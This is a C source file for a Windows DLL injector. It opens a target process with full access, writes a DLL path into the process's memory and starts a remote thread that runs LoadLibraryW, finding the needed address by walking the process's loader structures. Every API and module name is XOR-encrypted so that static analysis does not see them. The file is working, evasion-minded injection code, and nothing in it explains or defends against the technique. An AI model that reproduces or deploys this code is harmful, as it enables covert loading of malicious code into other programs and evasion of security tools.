//injector.c
#include "injector.h"
#include "ntdll_ext.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>

static NtOpenProcess_t             fnNtOpenProcess = NULL;
static NtCreateThreadEx_t          fnNtCreateThreadEx = NULL;
static NtQueryInformationProcess_t fnNtQueryInformationProcess = NULL;
static NtReadVirtualMemory_t       fnNtReadVirtualMemory = NULL;
static NtAllocateVirtualMemory_t   fnNtAllocateVirtualMemory = NULL;
static NtWriteVirtualMemory_t      fnNtWriteVirtualMemory = NULL;
static NtFreeVirtualMemory_t       fnNtFreeVirtualMemory = NULL;

// === Phase 1: XOR-encrypted strings ===

// "NtOpenProcess" (13 char(s))
static const unsigned char k_NtOpenProcess[] = { 0xA7, 0xEC, 0xB2, 0x11, 0x6A, 0xD1, 0xB9, 0xEA, 0x92, 0x02, 0x6A, 0xCC, 0x9A };
static const size_t k_NtOpenProcess_len = 13;
static const unsigned char k_NtOpenProcess_key[] = { 0xE9, 0x98, 0xFD, 0x61, 0x0F, 0xBF };

// "NtCreateThreadEx" (16 char(s))
static const unsigned char k_NtCreateThreadEx[] = { 0x03, 0xEC, 0x27, 0x67, 0x4D, 0x93, 0x86, 0x28, 0xCC, 0x0C, 0x67, 0x4D, 0x93, 0x96, 0x08, 0xE0 };
static const size_t k_NtCreateThreadEx_len = 16;
static const unsigned char k_NtCreateThreadEx_key[] = { 0x4D, 0x98, 0x64, 0x15, 0x28, 0xF2, 0xF2 };

// "NtQueryInformationProcess" (25 char(s))
static const unsigned char k_NtQueryInformationProcess[] = { 0x8B, 0x6B, 0x39, 0xA9, 0x22, 0x51, 0xAF, 0x8E, 0xAB, 0x79, 0x07, 0xAE, 0x2A, 0x42, 0xA2, 0xAE, 0xAA, 0x71, 0x38, 0xAE, 0x28, 0x40, 0xB3, 0xB4, 0xB6 };
static const size_t k_NtQueryInformationProcess_len = 25;
static const unsigned char k_NtQueryInformationProcess_key[] = { 0xC5, 0x1F, 0x68, 0xDC, 0x47, 0x23, 0xD6, 0xC7 };

// "NtReadVirtualMemory" (19 char(s))
static const unsigned char k_NtReadVirtualMemory[] = { 0x54, 0x29, 0xDC, 0x31, 0x64, 0x7E, 0x0B, 0xE7, 0x26, 0x71, 0x6F, 0x3C, 0xE2, 0x19, 0x60, 0x77, 0x32, 0xFC, 0x2D };
static const size_t k_NtReadVirtualMemory_len = 19;
static const unsigned char k_NtReadVirtualMemory_key[] = { 0x1A, 0x5D, 0x8E, 0x54, 0x05 };

// "NtAllocateVirtualMemory" (23 char(s))
static const unsigned char k_NtAllocateVirtualMemory[] = { 0xAA, 0x67, 0xA1, 0x54, 0x5B, 0x6F, 0x21, 0x27, 0xD6, 0x81, 0x45, 0x89, 0x4A, 0x43, 0x75, 0x23, 0x2A, 0xEF, 0x81, 0x7E, 0x8F, 0x4A, 0x4E };
static const size_t k_NtAllocateVirtualMemory_len = 23;
static const unsigned char k_NtAllocateVirtualMemory_key[] = { 0xE4, 0x13, 0xE0, 0x38, 0x37, 0x00, 0x42, 0x46, 0xA2 };

// "NtWriteVirtualMemory" (20 char(s))
static const unsigned char k_NtWriteVirtualMemory[] = { 0x66, 0x50, 0xE7, 0x57, 0xBF, 0x11, 0x4D, 0x72, 0xD9, 0x57, 0xA2, 0x10, 0x49, 0x48, 0xFD, 0x40, 0xBB, 0x0A, 0x5A, 0x5D };
static const size_t k_NtWriteVirtualMemory_len = 20;
static const unsigned char k_NtWriteVirtualMemory_key[] = { 0x28, 0x24, 0xB0, 0x25, 0xD6, 0x65 };

// "NtFreeVirtualMemory" (19 char(s))
static const unsigned char k_NtFreeVirtualMemory[] = { 0xA7, 0xB9, 0x41, 0x43, 0x1C, 0xB3, 0x12, 0x80, 0xBF, 0x73, 0x44, 0x18, 0xBA, 0x09, 0x8C, 0xA0, 0x68, 0x43, 0x00 };
static const size_t k_NtFreeVirtualMemory_len = 19;
static const unsigned char k_NtFreeVirtualMemory_key[] = { 0xE9, 0xCD, 0x07, 0x31, 0x79, 0xD6, 0x44 };

// "LoadLibraryW" (12 char(s))
static const unsigned char k_LoadLibraryW[] = { 0x79, 0x8D, 0x9F, 0x91, 0x79, 0x8B, 0x9C, 0x87, 0x54, 0x90, 0x87, 0xA2 };
static const size_t k_LoadLibraryW_len = 12;
static const unsigned char k_LoadLibraryW_key[] = { 0x35, 0xE2, 0xFE, 0xF5 };

// L"ntdll.dll" (9 wchar(s))
static const unsigned char k_ntdll_dll[] = { 0x1F, 0x00, 0xD7, 0x00, 0x7F, 0x00, 0x1D, 0x00, 0xCD, 0x00, 0x5F, 0x00, 0xC7, 0x00, 0x77, 0x00, 0x1D, 0x00 };
static const size_t k_ntdll_dll_len = 9;
static const unsigned char k_ntdll_dll_key[] = { 0x71, 0xA3, 0x1B, 0x71, 0xA1 };

// L"kernel32.dll" (12 wchar(s))
static const unsigned char k_kernel32_dll[] = { 0x12, 0x00, 0x8B, 0x00, 0x54, 0x00, 0xFF, 0x00, 0x04, 0x00, 0x6E, 0x00, 0x4A, 0x00, 0xDC, 0x00, 0x08, 0x00, 0xF5, 0x00, 0x0D, 0x00, 0x6E, 0x00 };
static const size_t k_kernel32_dll_len = 12;
static const unsigned char k_kernel32_dll_key[] = { 0x79, 0xEE, 0x26, 0x91, 0x61, 0x02 };

// === End Phase 1 ===

static BOOL InitNtdll(void)
{
	WCHAR buf[64];

	if (!XorWStringToBuffer((const wchar_t*)k_ntdll_dll, k_ntdll_dll_len, buf, 64, k_ntdll_dll_key, sizeof(k_ntdll_dll_key)))
		return FALSE;

	HMODULE hNtDll = GetModuleHandleW(buf);
	if (!hNtDll) {
		return FALSE;
	}

	char nameBuf[64];

	if (!XorCStringToBuffer((const char*)k_NtOpenProcess, k_NtOpenProcess_len, nameBuf, 64, k_NtOpenProcess_key, sizeof(k_NtOpenProcess_key)))
		return FALSE;
	fnNtOpenProcess = (NtOpenProcess_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtCreateThreadEx, k_NtCreateThreadEx_len, nameBuf, 64, k_NtCreateThreadEx_key, sizeof(k_NtCreateThreadEx_key)))
		return FALSE;
	fnNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtQueryInformationProcess, k_NtQueryInformationProcess_len, nameBuf, 64, k_NtQueryInformationProcess_key, sizeof(k_NtQueryInformationProcess_key)))
		return FALSE;
	fnNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtReadVirtualMemory, k_NtReadVirtualMemory_len, nameBuf, 64, k_NtReadVirtualMemory_key, sizeof(k_NtReadVirtualMemory_key)))
		return FALSE;
	fnNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtAllocateVirtualMemory, k_NtAllocateVirtualMemory_len, nameBuf, 64, k_NtAllocateVirtualMemory_key, sizeof(k_NtAllocateVirtualMemory_key)))
		return FALSE;
	fnNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtWriteVirtualMemory, k_NtWriteVirtualMemory_len, nameBuf, 64, k_NtWriteVirtualMemory_key, sizeof(k_NtWriteVirtualMemory_key)))
		return FALSE;
	fnNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtDll, nameBuf);

	if (!XorCStringToBuffer((const char*)k_NtFreeVirtualMemory, k_NtFreeVirtualMemory_len, nameBuf, 64, k_NtFreeVirtualMemory_key, sizeof(k_NtFreeVirtualMemory_key)))
		return FALSE;
	fnNtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetProcAddress(hNtDll, nameBuf);

	return fnNtOpenProcess && fnNtCreateThreadEx && fnNtQueryInformationProcess &&
		fnNtReadVirtualMemory && fnNtAllocateVirtualMemory && fnNtWriteVirtualMemory &&
		fnNtFreeVirtualMemory;
}

static NTSTATUS GetRemoteModuleBase(HANDLE hProcess, LPCWSTR moduleName, PVOID* pBase)
{
#define MAX_MODULES_WALK 512
	PROCESS_BASIC_INFORMATION pbi = { 0 };

	NTSTATUS status = fnNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
	if (status != STATUS_SUCCESS) return status;

	PEB peb = { 0 };
	SIZE_T bytesRead = 0;

	status = fnNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);
	if (status != STATUS_SUCCESS) return status;

	PEB_LDR_DATA ldrData = { 0 };

	status = fnNtReadVirtualMemory(hProcess, peb.Ldr, &ldrData, sizeof(ldrData), &bytesRead);
	if (status != STATUS_SUCCESS) return status;

	LIST_ENTRY* pLdrListHead = &ldrData.InMemoryOrderModuleList;
	LIST_ENTRY* pCurrentEntry = ldrData.InMemoryOrderModuleList.Flink;
	DWORD modulesWalked = 0;

	while (pCurrentEntry != pLdrListHead)
	{
		if (++modulesWalked > MAX_MODULES_WALK) {
			status = STATUS_UNSUCCESSFUL;
			break;
		}

		LDR_DATA_TABLE_ENTRY entry = { 0 };

		status = fnNtReadVirtualMemory(hProcess, CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &entry, sizeof(entry), &bytesRead);
		if (status != STATUS_SUCCESS) return status;

		if (entry.BaseDllName.Buffer && entry.BaseDllName.Length > 0) {
			USHORT nameLen = entry.BaseDllName.Length;
			if (nameLen > 65535) nameLen = 65535; // guard against corrupted remote data

			WCHAR* buf = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (size_t)nameLen + sizeof(WCHAR));
			if (!buf) return STATUS_NO_MEMORY;

			status = fnNtReadVirtualMemory(hProcess, entry.BaseDllName.Buffer, buf, nameLen, &bytesRead);
			if (status == STATUS_SUCCESS) {
				buf[bytesRead / sizeof(WCHAR)] = L'\0';
				if (_wcsicmp(buf, moduleName) == 0) {
					*pBase = entry.DllBase;
					HeapFree(GetProcessHeap(), 0, buf);
					return STATUS_SUCCESS;
				}
			}
			HeapFree(GetProcessHeap(), 0, buf);
		}
		pCurrentEntry = entry.InMemoryOrderLinks.Flink;
	}
	return STATUS_NOT_FOUND;
#undef MAX_MODULES_WALK
}

static PVOID GetRemoteLoadLibraryW(HANDLE hProcess)
{
	PVOID remoteK32 = NULL;
	WCHAR buf[64];

	if (!XorWStringToBuffer((const wchar_t*)k_kernel32_dll, k_kernel32_dll_len, buf, 64, k_kernel32_dll_key, sizeof(k_kernel32_dll_key)))
		return NULL;

	NTSTATUS status = GetRemoteModuleBase(hProcess, buf, &remoteK32);
	if (status != STATUS_SUCCESS) return NULL;

	char nameBuf[64];
	if (!XorCStringToBuffer((const char*)k_LoadLibraryW, k_LoadLibraryW_len, nameBuf, 64, k_LoadLibraryW_key, sizeof(k_LoadLibraryW_key)))
		return NULL;

	PVOID localK32 = GetModuleHandleW(buf);
	PVOID localLoad = GetProcAddress(localK32, nameBuf);
	ULONG_PTR offset = (ULONG_PTR)localLoad - (ULONG_PTR)localK32;

	return (PVOID)((ULONG_PTR)remoteK32 + offset);
}

INJECT_STATUS InjectDll(DWORD pid, LPCWSTR dllPath)
{
	if (!InitNtdll()) return INJECT_ERR_NTDLL_INIT;

	HANDLE hTarget = NULL;
	OBJECT_ATTRIBUTES objAttr;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	CLIENT_ID cid = { .UniqueProcess = (HANDLE)(ULONG_PTR)pid, .UniqueThread = NULL };

	if (fnNtOpenProcess(&hTarget, PROCESS_ALL_ACCESS, &objAttr, &cid) != STATUS_SUCCESS) {
		return INJECT_ERR_OPEN_PROCESS;
	}

	PVOID remoteLoadLibraryW = GetRemoteLoadLibraryW(hTarget);
	if (!remoteLoadLibraryW) {
		CloseHandle(hTarget);
		return INJECT_ERR_RESOLVE_LOADLIBRARY;
	}

	SIZE_T dwSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
	PVOID remoteAddr = NULL;

	if (fnNtAllocateVirtualMemory(hTarget, &remoteAddr, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != STATUS_SUCCESS) {
		CloseHandle(hTarget);
		return INJECT_ERR_ALLOC;
	}

	SIZE_T bytesWritten = 0;
	NTSTATUS status = fnNtWriteVirtualMemory(hTarget, remoteAddr, (PVOID)dllPath, dwSize, &bytesWritten);
	if (status != STATUS_SUCCESS || bytesWritten != dwSize) {
		fnNtFreeVirtualMemory(hTarget, &remoteAddr, &dwSize, MEM_RELEASE);
		CloseHandle(hTarget);
		return INJECT_ERR_WRITE;
	}

	HANDLE hThread = NULL;
	status = fnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hTarget, remoteLoadLibraryW, remoteAddr, 0, 0, 0, 0, NULL);
	if (status != STATUS_SUCCESS) {
		fnNtFreeVirtualMemory(hTarget, &remoteAddr, &dwSize, MEM_RELEASE);
		CloseHandle(hTarget);
		return INJECT_ERR_CREATE_THREAD;
	}

	DWORD waitResult = WaitForSingleObject(hThread, 30000);
	if (waitResult == WAIT_TIMEOUT) {
		TerminateThread(hThread, 0);
		CloseHandle(hThread);
		fnNtFreeVirtualMemory(hTarget, &remoteAddr, &dwSize, MEM_RELEASE);
		CloseHandle(hTarget);
		return INJECT_ERR_THREAD_TIMEOUT;
	}

	CloseHandle(hThread);
	fnNtFreeVirtualMemory(hTarget, &remoteAddr, &dwSize, MEM_RELEASE);
	CloseHandle(hTarget);

	return INJECT_OK;
}
